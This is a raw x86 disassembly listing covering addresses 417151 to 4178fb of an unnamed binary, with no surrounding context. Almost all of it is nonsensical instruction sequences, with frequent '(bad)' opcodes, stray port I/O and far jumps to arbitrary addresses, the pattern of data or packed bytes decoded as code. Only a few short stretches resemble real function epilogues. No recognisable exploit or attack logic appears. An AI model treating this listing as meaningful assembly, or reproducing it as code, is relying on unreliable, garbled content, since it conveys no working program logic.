  417151:	scas   eax,DWORD PTR es:[edi]
  417152:	clc    
  417153:	fxch   st(6)
  417155:	ss pop esp
  417157:	fidivr DWORD PTR [ecx]
  417159:	pushf  
  41715a:	(bad)  
  41715b:	jmp    0xa3d65cd1
  417160:	in     eax,0x5c
  417162:	fnstcw WORD PTR ds:0x9562582d
  417168:	push   es
  417169:	or     dl,BYTE PTR [esi-0x3f]
  41716c:	adc    al,BYTE PTR [edx+0x12a1ce77]
  417172:	in     eax,0x6c
  417174:	inc    edi
  417175:	sub    al,0x57
  417177:	cmp    ch,cl
  417179:	sahf   
  41717a:	fnstcw WORD PTR [esi+0x19d359f6]
  417180:	imul   edx,DWORD PTR [eax-0x60],0x16
  417184:	enter  0x658f,0x2f
  417188:	push   edi
  417189:	xchg   BYTE PTR [ebx],dh
  41718b:	data16 sbb BYTE PTR [eax],dh
  41718e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41718f:	add    BYTE PTR [edx],0xaa
  417192:	sti    
  417193:	sub    edx,ecx
  417195:	xlat   BYTE PTR ds:[ebx]
  417196:	fisttp DWORD PTR [edi-0x51]
  417199:	repz or edx,esi
  41719c:	dec    edx
  41719d:	dec    ebp
  41719e:	push   0x805a5e30
  4171a3:	xchg   ebx,eax
  4171a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171a5:	out    dx,eax
  4171a6:	mov    ds:0x1209d1e,eax
  4171ab:	adc    bl,BYTE PTR [eax]
  4171ad:	adc    cl,BYTE PTR [edi-0x28c8ea84]
  4171b3:	data16 stc 
  4171b5:	jno    0x417196
  4171b7:	mov    al,0x35
  4171b9:	cmp    ch,BYTE PTR [esi+0x2680391]
  4171bf:	push   eax
  4171c0:	dec    edi
  4171c1:	outs   dx,BYTE PTR ds:[esi]
  4171c2:	xor    al,0x68
  4171c4:	aaa    
  4171c5:	int3   
  4171c6:	sti    
  4171c7:	imul   eax,DWORD PTR [ebx+0xd],0x34
  4171cb:	pop    ebx
  4171cc:	out    0x9e,eax
  4171ce:	jns    0x4171f4
  4171d0:	xchg   DWORD PTR [eax*4+0x15e7f14],edi
  4171d7:	xchg   esp,eax
  4171d8:	outs   dx,BYTE PTR ds:[esi]
  4171d9:	mov    ah,0x79
  4171db:	repz xor ah,bh
  4171de:	dec    ebp
  4171df:	jae    0x4171bc
  4171e1:	stos   DWORD PTR es:[edi],eax
  4171e2:	cld    
  4171e3:	push   ebp
  4171e4:	cmp    dh,BYTE PTR [eax]
  4171e6:	mul    BYTE PTR [ecx+0x4efdec8b]
  4171ec:	push   edx
  4171ed:	jl     0x4171b6
  4171ef:	pop    ebx
  4171f0:	fst    DWORD PTR [esi-0x11]
  4171f3:	sbb    al,BYTE PTR [edi+0x5]
  4171f6:	outs   dx,BYTE PTR ds:[esi]
  4171f7:	xor    DWORD PTR [ebx],0x63
  4171fa:	clc    
  4171fb:	call   0xad2f:0xbc47d9d4
  417202:	sbb    DWORD PTR [esi+0x62358eba],esp
  417208:	or     ebx,eax
  41720a:	cmp    BYTE PTR [ebp+0x32879e26],dl
  417210:	xor    BYTE PTR [ebp-0x3880c34d],dl
  417216:	mov    ?,WORD PTR [edx+0x66]
  417219:	jne    0x41727f
  41721b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41721c:	shl    DWORD PTR [eax],1
  41721e:	mov    ds:0x2e8cf9a0,eax
  417223:	mul    BYTE PTR [edi-0x6a]
  417226:	dec    edx
  417227:	cmp    cl,BYTE PTR [eax-0x748d6704]
  41722d:	adc    eax,0x47de1699
  417232:	sub    al,0x8c
  417234:	lea    esi,[ebp+0x16]
  417237:	xor    DWORD PTR [esi-0x7f],ecx
  41723a:	pop    eax
  41723b:	xchg   ebp,eax
  41723c:	clc    
  41723d:	dec    edx
  41723e:	inc    ebx
  41723f:	add    ebx,DWORD PTR [edx+ebx*1]
  417242:	dec    ebx
  417243:	jmp    0x417527
  417248:	fsubrp st(0),st
  41724a:	(bad)  
  41724b:	stos   BYTE PTR es:[edi],al
  41724c:	mov    gs,WORD PTR [edx-0x16]
  41724f:	ins    BYTE PTR es:[edi],dx
  417250:	leave  
  417251:	pop    ebx
  417252:	sub    al,0x41
  417254:	jnp    0x41720a
  417256:	retf   
  417257:	out    dx,al
  417258:	jo     0x417280
  41725a:	jg     0x4172cc
  41725c:	mov    ecx,0x5e70707e
  417261:	stc    
  417262:	sbb    BYTE PTR [eax-0x1723116c],bh
  417268:	lahf   
  417269:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41726a:	jge    0x4172ae
  41726c:	rcl    DWORD PTR [edx-0x5c6a047b],0x91
  417273:	cmp    BYTE PTR [edx+edi*2],dh
  417276:	cmp    eax,0x7fa5d2ed
  41727b:	push   0x2d763ac4
  417280:	jmp    0xb708:0xce31fd29
  417287:	je     0x41726d
  417289:	ds xchg sp,ax
  41728c:	mov    edi,0x9de90f0b
  417291:	fadd   DWORD PTR [edx-0x74]
  417294:	jno    0x4172bb
  417296:	pop    eax
  417297:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417298:	sbb    BYTE PTR [edx+edi*1+0xef77db7],ah
  41729f:	dec    edi
  4172a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172a1:	iret   
  4172a2:	xlat   BYTE PTR ds:[ebx]
  4172a3:	stc    
  4172a4:	shl    DWORD PTR [ebx],0x6f
  4172a7:	inc    edi
  4172a8:	test   DWORD PTR [esi-0x64a8427c],edi
  4172ae:	dec    edi
  4172af:	pop    edx
  4172b0:	and    edx,esi
  4172b2:	(bad)  
  4172b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172b4:	fldenv ds:0xe2d78d64
  4172ba:	daa    
  4172bb:	je     0x4172cd
  4172bd:	xchg   DWORD PTR [ebx-0x70],edx
  4172c0:	xchg   ebx,eax
  4172c1:	outs   dx,DWORD PTR ds:[esi]
  4172c2:	sub    BYTE PTR [eax],ah
  4172c4:	adc    BYTE PTR [ebp+ebx*1+0xb6bd9fa],0x9a
  4172cc:	mov    edi,0x783cbd8e
  4172d1:	les    ecx,FWORD PTR [edx]
  4172d3:	rcl    BYTE PTR [edi+0x1b72ce76],cl
  4172d9:	cwde   
  4172da:	xchg   ebp,eax
  4172db:	inc    eax
  4172dc:	(bad)  [eax-0x23]
  4172df:	icebp  
  4172e0:	fnsetpm(287 only) 
  4172e2:	fwait
  4172e3:	sahf   
  4172e4:	repz sub esp,DWORD PTR [edx-0x671ecd3e]
  4172eb:	cmp    al,0xc4
  4172ed:	cli    
  4172ee:	sbb    ah,dl
  4172f0:	mov    cl,0x2c
  4172f2:	imul   BYTE PTR [esi+0x50]
  4172f5:	add    al,0xba
  4172f7:	and    edi,esi
  4172f9:	(bad)  
  4172fa:	pop    esi
  4172fb:	mov    ch,0x7f
  4172fd:	iret   
  4172fe:	xchg   esp,eax
  4172ff:	icebp  
  417300:	mov    edx,0x494cd848
  417305:	in     al,dx
  417306:	push   edi
  417307:	enter  0x670c,0x31
  41730b:	repnz and DWORD PTR [edi+0xd30a3c3],eax
  417312:	sub    eax,0x7b250c1e
  417317:	into   
  417318:	std    
  417319:	ins    DWORD PTR es:[edi],dx
  41731a:	(bad)  
  41731b:	mov    ah,0xd6
  41731d:	repnz xor DWORD PTR [ebx+0x41],edx
  417321:	out    dx,eax
  417322:	out    dx,al
  417323:	lock pop edi
  417325:	mov    ebx,0x9f8e2fcc
  41732a:	and    cl,BYTE PTR [ecx+0x4d555543]
  417330:	fbstp  TBYTE PTR [ecx]
  417332:	ja     0x4172d3
  417334:	push   eax
  417335:	mov    ecx,DWORD PTR [ecx-0x49255b9a]
  41733b:	cli    
  41733c:	and    DWORD PTR [ebx-0x19433684],0xffffffdf
  417343:	add    ebp,esp
  417345:	je     0x417350
  417347:	mov    esp,DWORD PTR [esi-0xbe93247]
  41734d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41734e:	cmp    ch,ch
  417350:	pmuludq mm5,QWORD PTR [ecx-0x53]
  417354:	push   cs
  417355:	dec    edi
  417356:	add    DWORD PTR [ebx+0x515d46d3],0xc37fbc92
  417360:	lods   eax,DWORD PTR ds:[esi]
  417361:	jae    0x4173b0
  417363:	mov    ch,BYTE PTR [ebx+0x3d2fdd7e]
  417369:	mov    bh,BYTE PTR [ebx]
  41736b:	clc    
  41736c:	xchg   bp,ax
  41736e:	adc    al,0x40
  417370:	xor    esi,ebx
  417372:	(bad)  
  417373:	pop    ebp
  417374:	clc    
  417375:	dec    edx
  417376:	fsubr  DWORD PTR [ebp+0x620b10af]
  41737c:	dec    edx
  41737d:	in     eax,dx
  41737e:	rcl    DWORD PTR [esi+0x63],cl
  417381:	ds jmp 0x4f73:0x8ca2341e
  417389:	and    eax,0x2aaf8e69
  41738e:	into   
  41738f:	mov    ebx,0xd5d9e973
  417394:	mov    edi,0x2d1ff40f
  417399:	pusha  
  41739a:	pushf  
  41739b:	in     eax,0x6c
  41739d:	aas    
  41739e:	jg     0x41734a
  4173a0:	out    0x2,al
  4173a2:	mov    ebp,0xa997f89e
  4173a7:	(bad)  
  4173a8:	in     al,dx
  4173a9:	jo     0x417426
  4173ab:	bound  esp,QWORD PTR [esi+0xa5ebf31]
  4173b1:	in     al,0x24
  4173b3:	int    0x24
  4173b5:	iret   
  4173b6:	inc    ecx
  4173b7:	fisub  WORD PTR [ebx]
  4173b9:	stos   DWORD PTR es:[edi],eax
  4173ba:	adc    al,0x5d
  4173bc:	mov    bh,BYTE PTR [ecx+0x71]
  4173bf:	sub    ecx,DWORD PTR [esi-0x8]
  4173c2:	fimul  WORD PTR [esi]
  4173c4:	pop    esi
  4173c5:	mov    dh,0x9a
  4173c7:	mov    ecx,0xe73275c5
  4173cc:	push   0x7c
  4173ce:	jb     0x41737e
  4173d0:	push   ebx
  4173d1:	addr16 loop 0x41741e
  4173d4:	(bad)  
  4173d5:	imul   edi,DWORD PTR [ecx-0x13],0xffffffab
  4173d9:	(bad)  
  4173da:	loopne 0x4173df
  4173dc:	test   eax,0xc9987958
  4173e1:	in     al,dx
  4173e2:	jbe    0x4173a7
  4173e4:	ja     0x417445
  4173e6:	xchg   esp,eax
  4173e7:	xchg   BYTE PTR [ebx],dh
  4173e9:	add    ch,BYTE PTR [edx]
  4173eb:	mov    WORD PTR [ecx],es
  4173ed:	xor    ch,0xa1
  4173f0:	sti    
  4173f1:	xchg   ebx,eax
  4173f2:	add    al,0x4e
  4173f4:	outs   dx,DWORD PTR ds:[esi]
  4173f5:	imul   ebp,DWORD PTR [ebx],0xc8712edc
  4173fb:	sbb    ebp,DWORD PTR [ecx]
  4173fd:	add    BYTE PTR [esi+0x31f76d5e],dh
  417403:	jmp    0x2222:0xe603ff55
  41740a:	or     ecx,DWORD PTR [ebp-0x36]
  41740d:	add    ch,BYTE PTR [ebx]
  41740f:	fs js  0x4173ee
  417412:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417413:	mov    ebp,0xd3d6321f
  417418:	cmp    eax,0x7300581f
  41741d:	in     al,0xc9
  41741f:	jb     0x4173ca
  417421:	push   ds
  417422:	fisub  DWORD PTR [ebx]
  417424:	mov    cl,0x75
  417426:	add    al,0x62
  417428:	aaa    
  417429:	popa   
  41742a:	and    ch,BYTE PTR [edx+0x716d77e6]
  417430:	fs jge 0x41744e
  417433:	lods   al,BYTE PTR ds:[esi]
  417434:	xchg   edi,eax
  417435:	jo     0x4173db
  417437:	jmp    0xf2bb74a7
  41743c:	inc    ebx
  41743d:	pop    ds
  41743e:	out    dx,al
  41743f:	mov    WORD PTR es:[edi],es
  417442:	nop
  417443:	pop    es
  417444:	scas   al,BYTE PTR es:[edi]
  417445:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417446:	mov    ebp,DWORD PTR [esi+eax*4]
  417449:	push   ecx
  41744a:	inc    BYTE PTR [edi-0x40ea7b63]
  417450:	sub    DWORD PTR [ebx-0x1263a827],ecx
  417456:	xchg   ah,bl
  417458:	lods   eax,DWORD PTR ds:[esi]
  417459:	add    ebp,0xffffffc9
  41745c:	imul   esi,DWORD PTR [edx],0x78
  41745f:	and    al,0xab
  417461:	mov    eax,ds:0x8dad577a
  417466:	mov    edi,0x5860dc74
  41746b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41746c:	sub    dl,BYTE PTR [ebx+0x50]
  41746f:	or     al,0x80
  417471:	pop    esi
  417472:	xchg   edx,eax
  417473:	jg     0x41741c
  417475:	xor    al,0xb9
  417477:	and    edx,eax
  417479:	mov    edi,edi
  41747b:	sti    
  41747c:	test   eax,0xe31e47a7
  417481:	push   ebp
  417482:	in     eax,0x20
  417484:	and    BYTE PTR [esi],dh
  417486:	add    esp,DWORD PTR es:[ebp-0x2682b264]
  41748d:	push   esi
  41748e:	pushf  
  41748f:	mov    WORD PTR [edi+0x2755203b],es
  417495:	xchg   WORD PTR ds:0xa638224e,ax
  41749c:	mov    es,ecx
  41749e:	int    0xd6
  4174a0:	cmp    al,0x3f
  4174a2:	jp     0x4174ab
  4174a4:	push   edi
  4174a5:	ins    BYTE PTR es:[edi],dx
  4174a6:	sbb    ecx,DWORD PTR [edx+eiz*1]
  4174a9:	pop    ds
  4174aa:	sub    BYTE PTR [ebx+0x6c],dh
  4174ad:	mov    ds:0xa7995802,al
  4174b2:	jl     0x41750a
  4174b4:	imul   esp,DWORD PTR [ecx],0xc0b051e5
  4174ba:	sub    DWORD PTR [esp+esi*8-0x15],eax
  4174be:	mov    ch,BYTE PTR cs:[ebp-0x70]
  4174c2:	push   esi
  4174c3:	lods   al,BYTE PTR ds:[esi]
  4174c4:	sub    ebp,ebp
  4174c6:	jnp    0x417508
  4174c8:	nop
  4174c9:	jb     0x41748f
  4174cb:	xor    DWORD PTR [edx],0xfffffff0
  4174ce:	rcr    al,cl
  4174d0:	pop    edi
  4174d1:	jb     0x417499
  4174d3:	popf   
  4174d4:	add    cl,cl
  4174d6:	cli    
  4174d7:	jmp    0x41754b
  4174d9:	data16 jno 0x4174fb
  4174dc:	add    eax,0x5bad5006
  4174e1:	pop    esp
  4174e2:	(bad)  
  4174e3:	sub    eax,0x7eb09d8b
  4174e8:	pop    ds
  4174e9:	test   al,0xed
  4174eb:	lods   eax,DWORD PTR ds:[esi]
  4174ec:	fist   DWORD PTR [ebx-0x80]
  4174ef:	dec    eax
  4174f0:	add    eax,0x1e3f89fe
  4174f5:	xchg   ecx,eax
  4174f6:	inc    ecx
  4174f7:	jge    0x4174ac
  4174f9:	hlt    
  4174fa:	in     al,dx
  4174fb:	mov    edi,0x483abd02
  417500:	fsubr  st(7),st
  417502:	das    
  417503:	out    dx,eax
  417504:	popa   
  417505:	push   ebp
  417506:	xchg   ecx,eax
  417507:	lahf   
  417508:	popa   
  417509:	sahf   
  41750a:	scas   al,BYTE PTR es:[edi]
  41750b:	in     eax,dx
  41750c:	jne    0x417585
  41750e:	fst    QWORD PTR [eax]
  417510:	bound  edi,QWORD PTR [esi]
  417512:	test   eax,0xf1931a42
  417517:	jno    0x417597
  417519:	imul   ebp,ebx,0x4b
  41751c:	pop    ebx
  41751d:	lahf   
  41751e:	lds    edi,FWORD PTR [edx]
  417520:	mov    al,0x4b
  417522:	push   eax
  417523:	cmc    
  417524:	icebp  
  417525:	mov    dh,0x8a
  417527:	xor    edx,edx
  417529:	add    DWORD PTR [ebp-0xc],ebx
  41752c:	pop    ebx
  41752d:	mov    eax,DWORD PTR [ebp-0xc]
  417530:	pop    edi
  417531:	jmp    0x417815
  417536:	cld    
  417537:	pop    esi
  417538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417539:	addr16 popa 
  41753b:	gs mov esp,0x68365a61
  417541:	mov    DWORD PTR [ebx],edi
  417543:	fisttp DWORD PTR [eax+0x6]
  417546:	mov    ecx,0xb9707f24
  41754b:	jle    0x4175bd
  41754d:	jo     0x4175ad
  41754f:	jmp    0x7dbe1798
  417554:	aam    0x66
  417556:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417557:	fldcw  WORD PTR [ebp+0x6e6abf34]
  41755d:	adc    ah,BYTE PTR [esi+eiz*1+0x6f5b66e3]
  417564:	std    
  417565:	icebp  
  417566:	sbb    ecx,ecx
  417568:	inc    ebp
  417569:	pop    edi
  41756a:	arpl   WORD PTR [ecx+0x49e1b67d],bx
  417570:	push   edi
  417571:	(bad)  
  417572:	adc    bh,BYTE PTR [esi-0x224ef08b]
  417578:	sbb    al,BYTE PTR [ebp-0xc78d9e1]
  41757e:	sar    DWORD PTR [edi+0x72],0xa
  417582:	inc    esi
  417583:	mov    esp,0x90ce6fda
  417588:	mov    esi,ss
  41758a:	xlat   BYTE PTR ds:[ebx]
  41758b:	add    DWORD PTR [ebx],eax
  41758d:	hlt    
  41758e:	test   DWORD PTR [eax-0x38],edi
  417591:	sbb    al,0xf3
  417593:	mov    bh,BYTE PTR [esi-0x5f]
  417596:	mov    DWORD PTR [ebx-0x73c4649a],ecx
  41759c:	fst    DWORD PTR [edx+0x28]
  41759f:	and    BYTE PTR [ebx],cl
  4175a1:	(bad)  
  4175a2:	push   esi
  4175a3:	outs   dx,DWORD PTR ds:[esi]
  4175a4:	imul   esi,DWORD PTR [edi-0x417ce5e6],0xf20f8009
  4175ae:	and    ah,ch
  4175b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175b1:	bound  ebp,QWORD PTR [ebp-0x6b]
  4175b4:	shr    bh,0x13
  4175b7:	arpl   sp,dx
  4175b9:	std    
  4175ba:	or     BYTE PTR [edi+0x3a],0xf5
  4175be:	inc    edx
  4175bf:	(bad)  
  4175c0:	movq   mm7,QWORD PTR [edi+ecx*4]
  4175c4:	dec    ebp
  4175c5:	push   cs
  4175c6:	jp     0x4175c2
  4175c8:	xor    bl,BYTE PTR [ecx+esi*8+0x32]
  4175cc:	jbe    0x417574
  4175ce:	and    edi,DWORD PTR [ebx+0x505580fe]
  4175d4:	loop   0x417614
  4175d6:	mov    esi,0xef80427a
  4175db:	dec    edx
  4175dc:	pop    esi
  4175dd:	leave  
  4175de:	adc    BYTE PTR [eax+0x323699c8],ch
  4175e4:	fwait
  4175e5:	mov    eax,0xf3ad011c
  4175ea:	push   eax
  4175eb:	and    al,0x3e
  4175ed:	push   ss
  4175ee:	ins    DWORD PTR es:[edi],dx
  4175ef:	mov    eax,ds:0x1be91ad5
  4175f4:	les    edi,FWORD PTR [ecx]
  4175f6:	pop    ebx
  4175f7:	dec    ebp
  4175f8:	xchg   edx,eax
  4175f9:	rcl    BYTE PTR [ebp+eiz*2+0x74],0x4c
  4175fe:	ins    DWORD PTR es:[edi],dx
  4175ff:	inc    eax
  417600:	or     DWORD PTR ds:0xd5db51ed,esi
  417606:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417607:	aas    
  417608:	mov    ch,0x8d
  41760a:	jp     0x41760d
  41760c:	aad    0xb8
  41760e:	jmp    0xa39c1934
  417613:	jne    0x4175a3
  417615:	mov    edi,0x90212861
  41761a:	sbb    edx,ecx
  41761c:	mov    eax,ds:0x478d690b
  417621:	fidiv  WORD PTR ds:0xcd55bf7b
  417627:	(bad)  
  417629:	popa   
  41762a:	sub    ebx,edx
  41762c:	jmp    0x417688
  41762e:	(bad)  
  41762f:	push   es
  417630:	pop    ds
  417631:	es (bad) 
  417633:	daa    
  417634:	mov    eax,ds:0xdfb06ec5
  417639:	mov    DWORD PTR [edi],edi
  41763b:	xor    edi,edi
  41763d:	adc    ch,BYTE PTR [eax-0x49]
  417640:	lods   al,BYTE PTR ds:[esi]
  417641:	jmp    0x319abde6
  417646:	call   0xcbe9a018
  41764b:	sbb    eax,0x6d771d04
  417650:	push   ebp
  417651:	aaa    
  417652:	inc    eax
  417653:	adc    BYTE PTR [ebx],0xb2
  417656:	cmp    bh,BYTE PTR [eax]
  417658:	call   0x3938:0x758322e7
  41765f:	and    ebp,DWORD PTR [ecx+0x1b062fac]
  417665:	std    
  417666:	ret    
  417667:	push   0x7c351c1a
  41766c:	and    eax,0xdc291ea4
  417671:	daa    
  417672:	inc    ecx
  417673:	stos   DWORD PTR es:[edi],eax
  417674:	call   0xfae8:0x4397f685
  41767b:	pushf  
  41767c:	jne    0x41763d
  41767e:	cmp    DWORD PTR [eax],0x30
  417681:	jmp    0x417678
  417683:	mov    esp,0x26022f2d
  417688:	test   ebx,edi
  41768a:	outs   dx,BYTE PTR ds:[esi]
  41768b:	sbb    dl,ch
  41768d:	out    0xe2,al
  41768f:	repz and al,0xe2
  417692:	outs   dx,DWORD PTR ds:[esi]
  417693:	adc    BYTE PTR [esi+0x28ab8b67],al
  417699:	inc    BYTE PTR [ecx]
  41769b:	ret    0xa1d9
  41769e:	fistp  WORD PTR [ebx+eiz*1]
  4176a1:	cwde   
  4176a2:	cwde   
  4176a3:	cpuid  
  4176a5:	or     eax,0xd355b916
  4176aa:	push   edx
  4176ab:	pop    edx
  4176ac:	pop    ss
  4176ad:	popa   
  4176ae:	loop   0x4176ba
  4176b0:	dec    ecx
  4176b1:	inc    ecx
  4176b2:	push   eax
  4176b3:	xlat   BYTE PTR ds:[ebx]
  4176b4:	push   0xffffffcf
  4176b6:	mov    BYTE PTR [edi+0x78d90399],dl
  4176bc:	test   al,0xff
  4176be:	leave  
  4176bf:	or     esp,edx
  4176c1:	inc    esi
  4176c2:	push   ss
  4176c3:	inc    ebx
  4176c4:	fstp   TBYTE PTR [ebp+esi*4+0x3e]
  4176c8:	jae    0x41766a
  4176ca:	jno    0x4176ae
  4176cc:	sti    
  4176cd:	retf   0xbdaf
  4176d0:	cwde   
  4176d1:	push   eax
  4176d2:	and    al,0xb4
  4176d4:	cld    
  4176d5:	fs push si
  4176d8:	(bad)  
  4176da:	pop    ecx
  4176db:	xchg   ebx,eax
  4176dc:	popa   
  4176dd:	dec    ebp
  4176de:	xor    ebp,DWORD PTR [ebx-0x2d]
  4176e1:	mov    al,0x4b
  4176e3:	push   edi
  4176e4:	jns    0x4176a8
  4176e6:	lods   eax,DWORD PTR ds:[esi]
  4176e7:	cmp    BYTE PTR [edi],ah
  4176e9:	mov    al,0xa3
  4176eb:	xchg   edi,eax
  4176ec:	shl    ch,cl
  4176ee:	cmp    BYTE PTR [edi+0x58562878],0x7a
  4176f5:	pop    ss
  4176f6:	pop    eax
  4176f7:	push   esi
  4176f9:	xchg   BYTE PTR [ebx+eiz*2-0x78],dl
  4176fd:	mov    dh,0xeb
  4176ff:	xor    ecx,ebp
  417701:	stos   DWORD PTR es:[edi],eax
  417702:	adc    bl,BYTE PTR [esp+ecx*8-0x549651f3]
  417709:	fistp  WORD PTR [ecx+0x5f]
  41770c:	retf   0xffd1
  41770f:	(bad)  
  417711:	and    ecx,0x71
  417714:	(bad)  
  417715:	out    dx,al
  417716:	and    ah,dh
  417718:	cmp    BYTE PTR [eax+ecx*4+0x5e2074c2],cl
  41771f:	scas   eax,DWORD PTR es:[edi]
  417720:	mov    ebx,0xdfc9630c
  417725:	jns    0x41770b
  417727:	test   DWORD PTR [edi],esi
  417729:	pop    ss
  41772a:	jmp    0xd12b:0xcac579c8
  417731:	je     0x4176f2
  417733:	out    0x9d,eax
  417735:	lahf   
  417736:	loop   0x417756
  417738:	jmp    0x41770e
  41773a:	test   DWORD PTR ds:0xa501e01c,0x682f80aa
  417744:	nop
  417745:	sub    BYTE PTR [ebp+0x3caba4ce],bh
  41774b:	lahf   
  41774c:	sbb    esi,DWORD PTR [ecx]
  41774e:	leave  
  41774f:	test   eax,0x55f1cbde
  417754:	cmp    BYTE PTR ds:0x44a4b74,cl
  41775a:	xchg   ebx,eax
  41775b:	ds fadd st(5),st
  41775e:	add    al,BYTE PTR [edi+0x64b77df3]
  417764:	stos   DWORD PTR es:[edi],eax
  417765:	shr    BYTE PTR [edx],1
  417767:	mov    al,0x36
  417769:	push   0x851afabc
  41776e:	inc    eax
  41776f:	icebp  
  417770:	mov    al,ds:0xfe86a735
  417775:	stc    
  417776:	mov    bl,0x7
  417778:	sti    
  417779:	repz fldenv [ecx+0x44f9683b]
  417780:	or     eax,0x2d4c8338
  417785:	inc    edx
  417786:	mov    bl,0xfc
  417788:	fdiv   QWORD PTR [ecx]
  41778a:	or     ebp,0xa670cd5d
  417790:	dec    BYTE PTR [ebx]
  417792:	adc    BYTE PTR [esi+ecx*2+0x204cbc94],al
  417799:	cli    
  41779a:	loopne 0x4177e4
  41779c:	mov    eax,ds:0x1599e23d
  4177a1:	cs xchg ebp,eax
  4177a3:	outs   dx,DWORD PTR ds:[esi]
  4177a4:	add    bl,BYTE PTR [edx-0x13]
  4177a7:	mov    dl,0xbe
  4177a9:	out    dx,al
  4177aa:	sahf   
  4177ab:	mov    cl,0xfd
  4177ad:	mov    dh,0x39
  4177af:	aas    
  4177b0:	cmp    edx,edx
  4177b2:	and    al,0xda
  4177b4:	div    BYTE PTR [edi+ebp*8-0x17147ece]
  4177bb:	scas   al,BYTE PTR es:[edi]
  4177bc:	shl    edx,1
  4177be:	js     0x417761
  4177c0:	lods   eax,DWORD PTR ds:[esi]
  4177c1:	mov    dl,0x37
  4177c3:	leave  
  4177c4:	mov    ebx,DWORD PTR [edx-0x76]
  4177c7:	sub    edx,esp
  4177c9:	xor    ch,dh
  4177cb:	jle    0x4177a6
  4177cd:	pop    eax
  4177ce:	inc    eax
  4177cf:	adc    eax,0x1d99211b
  4177d4:	ja     0x417798
  4177d6:	in     al,dx
  4177d7:	pop    edx
  4177d8:	mov    ebx,0x2ed79b8
  4177dd:	fisttp DWORD PTR [edx+eax*2]
  4177e0:	add    BYTE PTR [edi+0x53],bh
  4177e3:	fisubr DWORD PTR [edx]
  4177e5:	fwait
  4177e6:	ret    
  4177e7:	fwait
  4177e8:	ds mov ebx,0x857dda6c
  4177ee:	jle    0x417853
  4177f0:	(bad)  [eax-0x4f]
  4177f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177f4:	xchg   esi,eax
  4177f5:	mov    DWORD PTR [esi+esi*4],esp
  4177f8:	mov    dl,0x7
  4177fa:	mov    esp,0xdf05c788
  4177ff:	pop    ebp
  417800:	jecxz  0x41783b
  417802:	dec    eax
  417803:	jno    0x41787a
  417805:	sub    DWORD PTR [ebp-0x5c],esp
  417808:	out    dx,eax
  417809:	or     BYTE PTR [edx],al
  41780b:	xchg   ecx,eax
  41780c:	aad    0x96
  41780e:	pop    edx
  41780f:	add    esp,0x2befdfce
  417815:	pop    esi
  417816:	pop    ebx
  417817:	leave  
  417818:	ret    0x10
  41781b:	dec    ebp
  41781c:	push   ebp
  41781d:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  417823:	mov    esp,ebp
  417825:	or     ah,dh
  417827:	dec    ebp
  417828:	add    bh,al
  41782a:	add    BYTE PTR [eax],cl
  41782c:	add    BYTE PTR [eax],al
  41782e:	mov    DWORD PTR [eax],0x40f44545
  417834:	xor    DWORD PTR [eax],eax
  417836:	test   DWORD PTR [ebx-0x34070b64],ecx
  41783c:	(bad)  
  41783d:	enter  0x4d45,0xbc
  417841:	mov    esi,DWORD PTR [eax]
  417843:	hlt    
  417844:	test   ebx,ecx
  417846:	pushf  
  417847:	enter  0x4df8,0x8b
  41784b:	mov    DWORD PTR [ebp-0x20],0x890208
  417852:	inc    ebp
  417853:	inc    ebp
  417854:	cld    
  417855:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41785b:	or     BYTE PTR [ebx+0x0],dl
  41785e:	mov    ebx,0x8bd5500
  417863:	call   DWORD PTR [ecx-0x1]
  417866:	pop    es
  417867:	mov    ch,0x33
  417869:	dec    ebx
  41786b:	(bad)  
  41786c:	mov    eax,0x72009ca4
  417871:	push   DWORD PTR [edx]
  417873:	or     BYTE PTR [eax],al
  417875:	jmp    0xff89:0x75c84d03
  41787c:	dec    ebp
  41787d:	loopne 0x41784f
  41787f:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  417885:	add    BYTE PTR [ebx],dh
  417887:	mov    ecx,ebx
  417889:	hlt    
  41788a:	add    ecx,ebx
  41788c:	enter  0x899c,0x32
  417890:	dec    ebp
  417891:	add    ecx,eax
  417893:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  417899:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4178a0:	xor    ecx,ebx
  4178a2:	retf   
  4178a3:	enter  0x4d03,0xc8
  4178a7:	mov    DWORD PTR fs:[eax],ebx
  4178aa:	lea    eax,[eax]
  4178ac:	push   esp
  4178ad:	mov    edi,edi
  4178af:	fs (bad) 
  4178b1:	(bad)  
  4178b2:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4178b8:	push   0xffffffff
  4178ba:	and    bh,bh
  4178bc:	pop    ecx
  4178bd:	inc    eax
  4178be:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4178c4:	push   0xffffff8b
  4178c6:	pop    ecx
  4178c7:	cld    
  4178c8:	dec    ebp
  4178c9:	lea    ecx,[ecx+0x45ff08ff]
  4178cf:	mov    BYTE PTR [edx+0x1],cl
  4178d2:	add    BYTE PTR [eax],al
  4178d4:	mov    DWORD PTR [ebp+0x8],0x58008d
  4178db:	dec    DWORD PTR [ebp-0x77]
  4178de:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4178e5:	cld    
  4178e6:	dec    ebp
  4178e7:	jne    0x41791c
  4178e9:	lea    eax,[ebx]
  4178eb:	push   eax
  4178ec:	mov    edi,edi
  4178ee:	or     BYTE PTR [ecx+0x54a845],cl
  4178f4:	add    al,ch
  4178f6:	(bad)  
  4178f7:	sub    esp,ebp
  4178f9:	add    BYTE PTR [eax],al
  4178fb:	rol    BYTE PTR [eax],0x84
